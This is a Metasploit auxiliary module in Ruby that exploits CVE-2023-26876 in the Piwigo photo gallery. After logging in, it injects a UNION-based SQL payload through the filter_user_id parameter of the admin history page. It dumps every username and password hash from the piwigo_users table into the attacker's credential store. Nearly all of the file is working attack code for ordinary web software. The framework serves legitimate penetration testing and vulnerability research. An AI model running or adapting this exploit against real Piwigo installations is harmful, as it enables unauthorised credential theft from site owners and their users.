##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  require 'metasploit/framework/hashes'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Piwigo CVE-2023-26876 Gather Credentials via SQL Injection ',
        'Description' => %q{
          This module allows an authenticated user to retrieve the usernames and encrypted passwords of other users in Piwigo through SQL injection using the (filter_user_id) parameter.
        },
        'Author' => [
          'rodnt'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2023-26876' ],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-26876'],
          ['Discover', 'Rodolfo Tavares'],
          ['Thanks', 'Tempest Security', 'Henrique Arcoverde']

        ],
        'DisclosureData' => '2023-04-21',
        'Platform' => 'ruby',
        'Arch' => ARCH_RUBY,
        'Privileged' => true,
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => ['CRASH_SAFE'],
          'Reliability' => ['REPEATABLE_SESSION'],
          'SideEffects' => ['IOC_IN_LOGS']
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Piwigo', '/' ]),
        OptString.new('USERNAME', [ true, 'The username for authenticating to Piwigo', 'piwigo' ]),
        OptString.new('PASSWORD', [ true, 'The password for authenticating to Piwigo', 'piwigo' ])
      ]
    )
  end

  def check
    login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')

    res = send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => normalize_uri(login_page)
    )

    if res && res.code == 200
      return res
    else
      print_error('[!] could not find any piwigo instance')
    end

    return res
  end

  def login(response)
    return false unless response

    login_uri = target_uri.path.end_with?('identification.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/identification.php')
    print_status('try to log in..')

    login_res = send_request_cgi(
      'method' => 'POST',
      'uri' => login_uri,
      'keep_cookies' => true,
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'login' => 'Login'
      }
    )

    if login_res.code != 302 || login_res.body.include?('Invalid username or password!')
      fail_with(Failure::NoAccess, "Couldn't log into Piwigo")
    end

    print_good('successfully logged into Piwigo!!')
    return login_res
  end

  def test_vulnerable(response)
    body_response = response.body.to_s
    if body_response.include?('var filter_user_name = "pwn3d";')
      print_good('target is vulnerable')
      return true
    else
      print_error('target is NOT vulnerable')
      return false
    end
  end

  def dump_data(sqli)
    creds_table = Rex::Text::Table.new(
      'Header' => 'Piwigo Users',
      'Indent' => 1,
      'Columns' => ['username', 'hash']
    )
    results = sqli.run_sql('select group_concat(cast(concat_ws(0x3b,ifnull(username,repeat(0x31,0)),ifnull(password,repeat(0xd,0))) as binary)) from piwigo_users')

    body_results = results.body.to_s
    match = body_results.match(/var filter_user_name = "(.*?)";/)
    if match
      data = match[1]
      data.split(',').each do |user_and_pw|
        split_user_pw = user_and_pw.split(';')
        user = split_user_pw[0]
        hash = split_user_pw[1]

        creds_table << [user, hash]
        create_credential({
          workspace_id: myworkspace_id,
          origin_type: :service,
          module_fullname: fullname,
          username: user,
          private_type: :nonreplayable_hash,
          jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
          private_data: user,
          service_name: 'piwigo',
          address: datastore['RHOST'],
          port: datastore['RPORT'],
          protocol: 'tcp',
          status: Metasploit::Model::Login::Status::UNTRIED
        })
      end
      rows_data = creds_table.rows.length
      if rows_data > 1
        print_good("get your l00t $\n")
        print_line creds_table.to_s
      end
    end
  end

  def get_info
    # 123123123 union all select group_concat(username,password) from piwigo_users
    @sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'admin.php'),
        'vars_get' => {
          'page' => 'history',
          'filter_image_id' => '1',
          'filter_user_id' => "123123123 union all #{payload}"
        }
      })
    end

    if test_vulnerable(@sqli.run_sql('select 0x70776e3364'))
      dump_data(@sqli)
    end
  end

  def run
    available_res = check
    fail_with(Failure::NotFound, 'Could not access the Piwigo webpage') unless available_res
    response_from_login = login(available_res)
    fail_with(Failure::NoAccess, 'Could not log in. Verify credentials') unless response_from_login
    get_info
  end
end
